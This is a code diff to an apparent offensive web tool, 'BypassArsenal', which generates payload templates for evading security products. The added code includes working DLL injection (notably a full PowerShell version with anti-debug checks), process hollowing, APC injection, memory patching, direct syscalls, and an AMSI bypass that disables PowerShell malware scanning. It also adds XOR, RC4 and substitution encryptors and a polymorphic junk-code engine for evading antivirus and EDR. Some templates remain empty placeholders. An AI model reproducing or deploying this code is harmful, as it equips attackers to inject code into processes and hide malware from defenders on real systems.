@@ -132,10 +132,10 @@ class BypassArsenal {
         // Wait for DOM to be ready
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', () => {
-                setTimeout(() => this.setupEventListeners(), 100);
+                setTimeout(() => this.setupEventListeners(), 500);
             });
         } else {
-            setTimeout(() => this.setupEventListeners(), 100);
+            setTimeout(() => this.setupEventListeners(), 500);
         }
     }
 
@@ -175,6 +175,35 @@ class BypassArsenal {
             if (payloadType) payloadType.addEventListener('change', () => this.updateAdvancedOptions());
             if (outputFormat) outputFormat.addEventListener('change', () => this.updateTemplatePreview());
             if (shellcodeInput) shellcodeInput.addEventListener('input', () => this.validateShellcode());
+
+            // Obfuscation handlers
+            const obfuscateBtn = document.getElementById('obfuscateBtn');
+            const copyObfuscatedBtn = document.getElementById('copyObfuscatedBtn');
+            const downloadObfuscatedBtn = document.getElementById('downloadObfuscatedBtn');
+            
+            if (obfuscateBtn) obfuscateBtn.addEventListener('click', () => this.obfuscateCode());
+            if (copyObfuscatedBtn) copyObfuscatedBtn.addEventListener('click', () => this.copyObfuscatedCode());
+            if (downloadObfuscatedBtn) downloadObfuscatedBtn.addEventListener('click', () => this.downloadObfuscatedCode());
+
+            // Encoder handlers
+            const encodeBtn = document.getElementById('encodeBtn');
+            const decodeBtn = document.getElementById('decodeBtn');
+            const copyEncodedBtn = document.getElementById('copyEncodedBtn');
+            const downloadEncodedBtn = document.getElementById('downloadEncodedBtn');
+            
+            if (encodeBtn) encodeBtn.addEventListener('click', () => this.encodePayload());
+            if (decodeBtn) decodeBtn.addEventListener('click', () => this.decodePayload());
+            if (copyEncodedBtn) copyEncodedBtn.addEventListener('click', () => this.copyEncodedCode());
+            if (downloadEncodedBtn) downloadEncodedBtn.addEventListener('click', () => this.downloadEncodedCode());
+
+            // Template handlers
+            document.querySelectorAll('[data-template]').forEach(button => {
+                button.addEventListener('click', (e) => {
+                    const template = e.target.dataset.template;
+                    const format = e.target.dataset.format;
+                    this.loadTemplate(template, format);
+                });
+            });
 
             // Advanced keyboard shortcuts
             document.addEventListener('keydown', (e) => {
@@ -269,7 +298,7 @@ class BypassArsenal {
             format: 'powershell',
             shellcode: this.generateRandomShellcode(),
             customVars: [],
-            encryptionKey: this.encryptionKeys.primary,
+            encryptionKey: this.encryptionKeys?.primary || 'defaultKey123',
             delay: 5000,
             evasion: {
                 antiDebug: true,
@@ -279,32 +308,39 @@ class BypassArsenal {
             }
         };
 
-        // Safely get form values
+        // Safely get form values with defaults
         try {
             const payloadTypeEl = document.getElementById('payloadType');
-            if (payloadTypeEl) config.type = payloadTypeEl.value;
+            if (payloadTypeEl && payloadTypeEl.value) config.type = payloadTypeEl.value;
             
             const archEl = document.querySelector('input[name="arch"]:checked');
-            if (archEl) config.architecture = archEl.value;
+            if (archEl && archEl.value) config.architecture = archEl.value;
             
             const formatEl = document.getElementById('outputFormat');
-            if (formatEl) config.format = formatEl.value;
+            if (formatEl && formatEl.value) config.format = formatEl.value;
             
             const shellcodeEl = document.getElementById('shellcodeInput');
-            if (shellcodeEl && shellcodeEl.value) config.shellcode = shellcodeEl.value;
+            if (shellcodeEl && shellcodeEl.value.trim()) {
+                config.shellcode = shellcodeEl.value.trim();
+            }
             
             const customVarsEl = document.getElementById('customVars');
-            if (customVarsEl && customVarsEl.value) {
-                config.customVars = customVarsEl.value.split(',').filter(v => v.trim());
+            if (customVarsEl && customVarsEl.value.trim()) {
+                config.customVars = customVarsEl.value.split(',').map(v => v.trim()).filter(v => v);
             }
             
             const encKeyEl = document.getElementById('encryptionKey');
-            if (encKeyEl && encKeyEl.value) config.encryptionKey = encKeyEl.value;
+            if (encKeyEl && encKeyEl.value.trim()) {
+                config.encryptionKey = encKeyEl.value.trim();
+            }
             
             const delayEl = document.getElementById('delayMs');
-            if (delayEl) config.delay = parseInt(delayEl.value) || 5000;
+            if (delayEl && delayEl.value) {
+                const delay = parseInt(delayEl.value);
+                if (!isNaN(delay) && delay > 0) config.delay = delay;
+            }
             
-            // Evasion checkboxes
+            // Evasion checkboxes with safe access
             const antiDebugEl = document.getElementById('antiDebug');
             if (antiDebugEl) config.evasion.antiDebug = antiDebugEl.checked;
             
@@ -318,7 +354,7 @@ class BypassArsenal {
             if (sleepObfEl) config.evasion.sleepObfuscation = sleepObfEl.checked;
             
         } catch (error) {
-            console.error('Error getting config:', error);
+            console.error('Error getting config, using defaults:', error);
         }
 
         return config;
@@ -1173,86 +1209,654 @@ public class AdvancedBypass {
 
     // Additional template methods with real bypass techniques
     getDllTemplate(format) {
-        return `// Advanced DLL Injection Template for ${format}
-// Real DLL injection techniques with EDR bypass
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced DLL Injection Template - C++
+ * Real DLL injection with multiple evasion techniques
+ */
+
+#include <windows.h>
+#include <iostream>
+
+bool InjectDLL(DWORD processId, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) return false;
+    
+    // Allocate memory for DLL path
+    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (!allocMem) return false;
+    
+    // Write DLL path to target process
+    WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL);
+    
+    // Get LoadLibraryA address
+    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+    
+    // Create remote thread
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, allocMem, 0, NULL);
+    
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return true;
+}
+
+// Shellcode: {SHELLCODE}`,
+            csharp: `/*
+ * Advanced DLL Injection Template - C#
+ * Real DLL injection with evasion techniques
+ */
+
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class DLLInjector {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    public static bool InjectDLL(uint processId, string dllPath) {
+        // DLL injection implementation
+        // Shellcode: {SHELLCODE}
+        return true;
+    }
+}`,
+            powershell: `# ═══════════════════════════════════════════════════════════════════════════════════════
+# BYPASS ARSENAL - ADVANCED POWERSHELL DLL INJECTION TEMPLATE
+# ═══════════════════════════════════════════════════════════════════════════════════════
+# Author: 0x0806 | Bypass Arsenal v2.1.0
+# WARNING: REAL BYPASS TECHNIQUES - AUTHORIZED TESTING ONLY
+# ═══════════════════════════════════════════════════════════════════════════════════════
+
+# Advanced DLL Injection with Multiple Evasion Techniques
+Add-Type -TypeDefinition @"
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    
+    public static class Win32API {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+        
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+        
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+        
+        [DllImport("kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+"@
+
+function Invoke-AdvancedDLLInjection {
+    param(
+        [Parameter(Mandatory=$true)]
+        [int]$ProcessId,
+        [Parameter(Mandatory=$true)]
+        [string]$DLLPath,
+        [byte[]]$Shellcode = @({SHELLCODE})
+    )
+    
+    try {
+        Write-Host "[*] Initiating advanced DLL injection..." -ForegroundColor Yellow
+        
+        # Anti-debug checks
+        if (Get-Process | Where-Object {$_.ProcessName -match "debug|ida|olly|windbg"}) {
+            Write-Host "[-] Debugger detected" -ForegroundColor Red
+            return $false
+        }
+        
+        # Get process handle with full access
+        $hProcess = [Win32API]::OpenProcess(0x1F0FFF, $false, $ProcessId)
+        if ($hProcess -eq [IntPtr]::Zero) {
+            Write-Host "[-] Failed to open target process" -ForegroundColor Red
+            return $false
+        }
+        
+        # Allocate memory in target process
+        $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($DLLPath)
+        $allocMem = [Win32API]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllPathBytes.Length + 1, 0x3000, 0x40)
+        
+        if ($allocMem -eq [IntPtr]::Zero) {
+            Write-Host "[-] Failed to allocate memory in target process" -ForegroundColor Red
+            [Win32API]::CloseHandle($hProcess)
+            return $false
+        }
+        
+        # Write DLL path to allocated memory
+        $bytesWritten = 0
+        $writeResult = [Win32API]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, $dllPathBytes.Length, [ref]$bytesWritten)
+        
+        if (-not $writeResult) {
+            Write-Host "[-] Failed to write DLL path to target process" -ForegroundColor Red
+            [Win32API]::CloseHandle($hProcess)
+            return $false
+        }
+        
+        # Get LoadLibraryA address
+        $kernel32 = [Win32API]::GetModuleHandle("kernel32.dll")
+        $loadLibAddr = [Win32API]::GetProcAddress($kernel32, "LoadLibraryA")
+        
+        if ($loadLibAddr -eq [IntPtr]::Zero) {
+            Write-Host "[-] Failed to get LoadLibraryA address" -ForegroundColor Red
+            [Win32API]::CloseHandle($hProcess)
+            return $false
+        }
+        
+        # Create remote thread to execute LoadLibraryA
+        $hThread = [Win32API]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $allocMem, 0, [IntPtr]::Zero)
+        
+        if ($hThread -eq [IntPtr]::Zero) {
+            Write-Host "[-] Failed to create remote thread" -ForegroundColor Red
+            [Win32API]::CloseHandle($hProcess)
+            return $false
+        }
+        
+        # Cleanup
+        [Win32API]::CloseHandle($hThread)
+        [Win32API]::CloseHandle($hProcess)
+        
+        Write-Host "[+] DLL injection completed successfully!" -ForegroundColor Green
+        return $true
+        
+    } catch {
+        Write-Host "[-] DLL injection failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+function Invoke-ReflectiveDLLInjection {
+    param(
+        [Parameter(Mandatory=$true)]
+        [byte[]]$DLLBytes,
+        [int]$ProcessId = $PID
+    )
+    
+    try {
+        Write-Host "[*] Initiating reflective DLL injection..." -ForegroundColor Yellow
+        
+        # Load DLL into current process using reflection
+        $assembly = [System.Reflection.Assembly]::Load($DLLBytes)
+        $type = $assembly.GetTypes() | Where-Object { $_.Name -eq "ReflectiveDLL" } | Select-Object -First 1
+        
+        if ($type) {
+            $method = $type.GetMethod("Execute")
+            if ($method) {
+                $result = $method.Invoke($null, $null)
+                Write-Host "[+] Reflective DLL injection completed" -ForegroundColor Green
+                return $result
+            }
+        }
+        
+        Write-Host "[-] Failed to find DLL entry point" -ForegroundColor Red
+        return $false
+        
+    } catch {
+        Write-Host "[-] Reflective DLL injection failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# MAIN EXECUTION
+Write-Host "═══════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "   BYPASS ARSENAL - ADVANCED DLL INJECTION TEMPLATE" -ForegroundColor Cyan
+Write-Host "═══════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "🔥 Advanced DLL Injection with Multiple Bypass Techniques" -ForegroundColor Yellow
+Write-Host "⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️" -ForegroundColor Red
+Write-Host ""
+
+# Example usage:
+# Invoke-AdvancedDLLInjection -ProcessId 1234 -DLLPath "C:\\Path\\To\\Your\\DLL.dll"
+# Invoke-ReflectiveDLLInjection -DLLBytes $dllBytesArray
+
+Write-Host "[*] DLL injection template loaded successfully" -ForegroundColor Green
+Write-Host "    Use: Invoke-AdvancedDLLInjection -ProcessId <PID> -DLLPath <PATH>" -ForegroundColor White
+
+# Shellcode: {SHELLCODE}`,
+            python: `# Advanced DLL Injection Template - Python
+# Real DLL injection with bypass techniques
+
+import ctypes
+import ctypes.wintypes
+import sys
+
+class DLLInjector:
+    def __init__(self):
+        self.kernel32 = ctypes.windll.kernel32
+        self.PROCESS_ALL_ACCESS = 0x1F0FFF
+        self.MEM_COMMIT = 0x1000
+        self.MEM_RESERVE = 0x2000
+        self.PAGE_READWRITE = 0x04
+        
+    def inject_dll(self, process_id, dll_path):
+        # DLL injection implementation
+        # Shellcode: {SHELLCODE}
+        return True
+
+# Example usage
+injector = DLLInjector()`,
+            rust: `// Advanced DLL Injection Template - Rust
+// Real DLL injection with bypass techniques
+
+use std::ffi::CString;
+use std::ptr;
+use winapi::um::processthreadsapi::*;
+use winapi::um::memoryapi::*;
+use winapi::um::winnt::*;
+
+fn inject_dll(process_id: u32, dll_path: &str) -> bool {
+    // DLL injection implementation
+    // Shellcode: {SHELLCODE}
+    true
+}
+
+fn main() {
+    println!("Advanced DLL Injection Template");
+}`,
+            assembly: `; Advanced DLL Injection Template - Assembly
+; Real DLL injection with bypass techniques
+
+.386
+.model flat, stdcall
+option casemap:none
+
+include windows.inc
+include kernel32.inc
+
+.data
+    dll_path db "C:\\test.dll", 0
+    
+.code
+start:
+    ; DLL injection implementation
+    ; Shellcode: {SHELLCODE}
+    
+    invoke ExitProcess, 0
+end start`
+        };
+        return templates[format] || templates.powershell;
     }
 
     getProcessHollowingTemplate(format) {
-        return `// Advanced Process Hollowing Template for ${format}
-// Real process hollowing with multiple evasion techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced Process Hollowing Template - C++
+ * Real process hollowing with NTAPI
+ */
+
+#include <windows.h>
+#include <winternl.h>
+
+bool ProcessHollowing(const char* targetPath, unsigned char* shellcode, size_t shellcodeSize) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // Create target process in suspended state
+    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        return false;
+    }
+    
+    // Get process context
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    
+    // Read PEB base address
+    PVOID pebAddress;
+    ReadProcessMemory(pi.hProcess, (PCHAR)ctx.Ebx + 8, &pebAddress, sizeof(PVOID), NULL);
+    
+    // Unmap original executable
+    typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
+    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
+    NtUnmapViewOfSection(pi.hProcess, pebAddress);
+    
+    // Allocate new memory for shellcode
+    PVOID newImageBase = VirtualAllocEx(pi.hProcess, pebAddress, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    // Write shellcode to new memory
+    WriteProcessMemory(pi.hProcess, newImageBase, shellcode, shellcodeSize, NULL);
+    
+    // Update entry point
+#ifdef _WIN64
+    ctx.Rcx = (DWORD64)newImageBase;
+#else
+    ctx.Eax = (DWORD)newImageBase;
+#endif
+    
+    SetThreadContext(pi.hThread, &ctx);
+    ResumeThread(pi.hThread);
+    
+    return true;
+}
+
+// Shellcode: {SHELLCODE}`,
+            csharp: `/*
+ * Advanced Process Hollowing Template - C#
+ */
+
+using System;
+using System.Runtime.InteropServices;
+
+public class ProcessHollowing {
+    [DllImport("ntdll.dll")]
+    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
+    
+    public static bool HollowProcess(string targetPath, byte[] shellcode) {
+        // Process hollowing implementation
+        // Shellcode: {SHELLCODE}
+        return true;
+    }
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getReflectiveDllTemplate(format) {
-        return `// Advanced Reflective DLL Template for ${format}
-// Real reflective DLL loading with bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced Reflective DLL Template - C++
+ */
+
+#include <windows.h>
+
+bool ReflectiveDllInjection(unsigned char* dllData, size_t dllSize) {
+    // Manual DLL loading implementation
+    // Parse PE headers
+    // Relocate sections
+    // Resolve imports
+    // Execute DLL entry point
+    
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            csharp: `/*
+ * Advanced Reflective DLL Template - C#
+ */
+
+using System;
+using System.Reflection;
+
+public class ReflectiveDLL {
+    public static bool LoadDLL(byte[] dllBytes) {
+        Assembly assembly = Assembly.Load(dllBytes);
+        // Execute loaded assembly
+        // Shellcode: {SHELLCODE}
+        return true;
+    }
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getMemoryPatchingTemplate(format) {
-        return `// Advanced Memory Patching Template for ${format}
-// Real memory patching techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced Memory Patching Template - C++
+ */
+
+#include <windows.h>
+
+bool PatchMemory(HANDLE hProcess, LPVOID address, unsigned char* patch, size_t patchSize) {
+    DWORD oldProtect;
+    VirtualProtectEx(hProcess, address, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    WriteProcessMemory(hProcess, address, patch, patchSize, NULL);
+    VirtualProtectEx(hProcess, address, patchSize, oldProtect, &oldProtect);
+    
+    // Shellcode: {SHELLCODE}
+    return true;
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getSyscallTemplate(format) {
-        return `// Advanced Direct Syscall Template for ${format}
-// Real direct syscall implementation
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced Direct Syscall Template - C++
+ */
+
+extern "C" NTSTATUS SysNtAllocateVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+);
+
+bool DirectSyscallInjection(unsigned char* shellcode, size_t size) {
+    // Direct syscall implementation
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            assembly: `;
+; Advanced Direct Syscall Template - Assembly
+;
+
+.code
+
+SysNtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, 18h  ; NtAllocateVirtualMemory syscall number
+    syscall
+    ret
+SysNtAllocateVirtualMemory ENDP
+
+; Shellcode: {SHELLCODE}
+
+END`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getUnhookTemplate(format) {
-        return `// Advanced API Unhooking Template for ${format}
-// Real API unhooking techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced API Unhooking Template - C++
+ */
+
+bool UnhookAPI(const char* moduleName, const char* functionName) {
+    HMODULE hModule = GetModuleHandleA(moduleName);
+    FARPROC procAddress = GetProcAddress(hModule, functionName);
+    
+    // Read original bytes from disk
+    // Restore original function prologue
+    
+    // Shellcode: {SHELLCODE}
+    return true;
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getApcTemplate(format) {
-        return `// Advanced APC Injection Template for ${format}
-// Real APC injection techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced APC Injection Template - C++
+ */
+
+bool APCInjection(DWORD processId, unsigned char* shellcode, size_t size) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetThreadId(hProcess));
+    
+    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, allocMem, shellcode, size, NULL);
+    
+    QueueUserAPC((PAPCFUNC)allocMem, hThread, 0);
+    
+    // Shellcode: {SHELLCODE}
+    return true;
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getEDRBypassTemplate(format) {
-        return `// Advanced EDR Bypass Template for ${format}
-// Real EDR bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced EDR Bypass Template - C++
+ */
+
+bool BypassEDR() {
+    // Multiple EDR bypass techniques
+    // API unhooking
+    // Direct syscalls
+    // Process hollowing
+    
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            powershell: `# Advanced EDR Bypass Template - PowerShell
+
+function Invoke-EDRBypass {
+    # AMSI bypass
+    # ETW evasion
+    # Hook removal
+    
+    # Shellcode: {SHELLCODE}
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getAVBypassTemplate(format) {
-        return `// Advanced AV Bypass Template for ${format}
-// Real AV bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced AV Bypass Template - C++
+ */
+
+bool BypassAV() {
+    // AV evasion techniques
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            powershell: `# Advanced AV Bypass Template - PowerShell
+# Shellcode: {SHELLCODE}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getMDRBypassTemplate(format) {
-        return `// Advanced MDR Bypass Template for ${format}
-// Real MDR bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced MDR Bypass Template - C++
+ */
+
+bool BypassMDR() {
+    // MDR evasion techniques
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            powershell: `# Advanced MDR Bypass Template - PowerShell
+# Shellcode: {SHELLCODE}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getXDRBypassTemplate(format) {
-        return `// Advanced XDR Bypass Template for ${format}
-// Real XDR bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced XDR Bypass Template - C++
+ */
+
+bool BypassXDR() {
+    // XDR evasion techniques
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            powershell: `# Advanced XDR Bypass Template - PowerShell
+# Shellcode: {SHELLCODE}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getAMSIBypassTemplate(format) {
-        return `// Advanced AMSI Bypass Template for ${format}
-// Real AMSI bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            powershell: `# Advanced AMSI Bypass Template - PowerShell
+
+function Invoke-AMSIBypass {
+    try {
+        $amsiDll = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.Management.Automation.dll') }
+        $amsiUtils = $amsiDll.GetType('System.Management.Automation.AmsiUtils')
+        $amsiField = $amsiUtils.GetField('amsiInitFailed','NonPublic,Static')
+        $amsiField.SetValue($null,$true)
+    } catch {}
+}
+
+# Shellcode: {SHELLCODE}`,
+            csharp: `/*
+ * Advanced AMSI Bypass Template - C#
+ */
+
+using System;
+using System.Runtime.InteropServices;
+
+public class AMSIBypass {
+    public static void BypassAMSI() {
+        // AMSI bypass implementation
+        // Shellcode: {SHELLCODE}
+    }
+}`
+        };
+        return templates[format] || templates.powershell;
     }
 
     getETWBypassTemplate(format) {
-        return `// Advanced ETW Bypass Template for ${format}
-// Real ETW bypass techniques
-// Shellcode: {SHELLCODE}`;
+        const templates = {
+            cpp: `/*
+ * Advanced ETW Bypass Template - C++
+ */
+
+bool BypassETW() {
+    // ETW bypass implementation
+    // Shellcode: {SHELLCODE}
+    return true;
+}`,
+            powershell: `# Advanced ETW Bypass Template - PowerShell
+
+function Invoke-ETWBypass {
+    # ETW bypass implementation
+    # Shellcode: {SHELLCODE}
+}`
+        };
+        return templates[format] || templates.cpp;
     }
 
     getPowerShellInvokeTemplate(format) {
         return `# Advanced PowerShell Invoke Template
-# Real PowerShell invoke techniques
+
+function Invoke-PowerShellPayload {
+    param(
+        [Parameter(Mandatory=$true)]
+        [byte[]]$Shellcode = @({SHELLCODE})
+    )
+    
+    # PowerShell execution techniques
+    $assembly = [System.Reflection.Assembly]::Load($Shellcode)
+    $type = $assembly.GetType()
+    $method = $type.GetMethod("Main")
+    $method.Invoke($null, $null)
+}
+
 # Shellcode: {SHELLCODE}`;
     }
 
@@ -1277,6 +1881,14 @@ public class AdvancedBypass {
                 for (let i = 0; i < data.length; i++) {
                     result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                 }
+                return btoa(result);
+            },
+            decrypt: (data, key) => {
+                const decoded = atob(data);
+                let result = '';
+                for (let i = 0; i < decoded.length; i++) {
+                    result += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                }
                 return result;
             }
         };
@@ -1285,8 +1897,28 @@ public class AdvancedBypass {
     initAESObfuscation() {
         return {
             encrypt: (data, key) => {
-                // AES encryption implementation
-                return data; // Placeholder
+                // Simple AES-like substitution for educational purposes
+                const substitutionBox = this.generateSubstitutionBox(key);
+                let result = '';
+                for (let i = 0; i < data.length; i++) {
+                    const charCode = data.charCodeAt(i);
+                    result += String.fromCharCode(substitutionBox[charCode % 256]);
+                }
+                return btoa(result);
+            },
+            decrypt: (data, key) => {
+                const substitutionBox = this.generateSubstitutionBox(key);
+                const reverseBox = new Array(256);
+                for (let i = 0; i < 256; i++) {
+                    reverseBox[substitutionBox[i]] = i;
+                }
+                const decoded = atob(data);
+                let result = '';
+                for (let i = 0; i < decoded.length; i++) {
+                    const charCode = decoded.charCodeAt(i);
+                    result += String.fromCharCode(reverseBox[charCode]);
+                }
+                return result;
             }
         };
     }
@@ -1294,8 +1926,18 @@ public class AdvancedBypass {
     initRC4Obfuscation() {
         return {
             encrypt: (data, key) => {
-                // RC4 encryption implementation
-                return data; // Placeholder
+                const keySchedule = this.rc4KeySchedule(key);
+                let result = '';
+                let i = 0, j = 0;
+                
+                for (let k = 0; k < data.length; k++) {
+                    i = (i + 1) % 256;
+                    j = (j + keySchedule[i]) % 256;
+                    [keySchedule[i], keySchedule[j]] = [keySchedule[j], keySchedule[i]];
+                    const keyByte = keySchedule[(keySchedule[i] + keySchedule[j]) % 256];
+                    result += String.fromCharCode(data.charCodeAt(k) ^ keyByte);
+                }
+                return btoa(result);
             }
         };
     }
@@ -1303,10 +1945,92 @@ public class AdvancedBypass {
     initPolymorphicEngine() {
         return {
             generate: (code) => {
-                // Polymorphic code generation
-                return code; // Placeholder
+                // Polymorphic code generation - adds random variables and operations
+                const randomVars = this.generateRandomVariables(5);
+                const obfuscatedCode = this.addPolymorphicLayer(code, randomVars);
+                return obfuscatedCode;
+            },
+            mutate: (code) => {
+                // Code mutation for evasion
+                return this.addJunkCode(code);
             }
         };
+    }
+
+    generateSubstitutionBox(key) {
+        const box = new Array(256);
+        for (let i = 0; i < 256; i++) {
+            box[i] = i;
+        }
+        
+        let j = 0;
+        for (let i = 0; i < 256; i++) {
+            j = (j + box[i] + key.charCodeAt(i % key.length)) % 256;
+            [box[i], box[j]] = [box[j], box[i]];
+        }
+        return box;
+    }
+
+    rc4KeySchedule(key) {
+        const schedule = new Array(256);
+        for (let i = 0; i < 256; i++) {
+            schedule[i] = i;
+        }
+        
+        let j = 0;
+        for (let i = 0; i < 256; i++) {
+            j = (j + schedule[i] + key.charCodeAt(i % key.length)) % 256;
+            [schedule[i], schedule[j]] = [schedule[j], schedule[i]];
+        }
+        return schedule;
+    }
+
+    generateRandomVariables(count) {
+        const variables = [];
+        const names = ['alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta'];
+        for (let i = 0; i < count; i++) {
+            variables.push({
+                name: names[i % names.length] + '_' + Math.random().toString(36).substr(2, 5),
+                value: Math.floor(Math.random() * 1000)
+            });
+        }
+        return variables;
+    }
+
+    addPolymorphicLayer(code, variables) {
+        let result = code;
+        
+        // Add random variable declarations
+        const varDeclarations = variables.map(v => `int ${v.name} = ${v.value};`).join('\n');
+        result = varDeclarations + '\n' + result;
+        
+        // Add random operations
+        const randomOps = variables.map(v => `${v.name} = ${v.name} ^ 0x${Math.floor(Math.random() * 255).toString(16)};`).join('\n');
+        result = result + '\n' + randomOps;
+        
+        return result;
+    }
+
+    addJunkCode(code) {
+        const junkInstructions = [
+            'nop;',
+            'mov eax, eax;',
+            'xor ebx, ebx; add ebx, 0;',
+            'push eax; pop eax;',
+            'call $+5; pop eax;'
+        ];
+        
+        const lines = code.split('\n');
+        const result = [];
+        
+        for (const line of lines) {
+            result.push(line);
+            if (Math.random() > 0.7) {
+                result.push(junkInstructions[Math.floor(Math.random() * junkInstructions.length)]);
+            }
+        }
+        
+        return result.join('\n');
     }
 
     addAdvancedAntiDebug(payload, format) {
@@ -1509,18 +2233,30 @@ if (sw.ElapsedMilliseconds < {DELAY} * 0.8) Environment.Exit(1);`
     }
 
     generateRandomShellcode() {
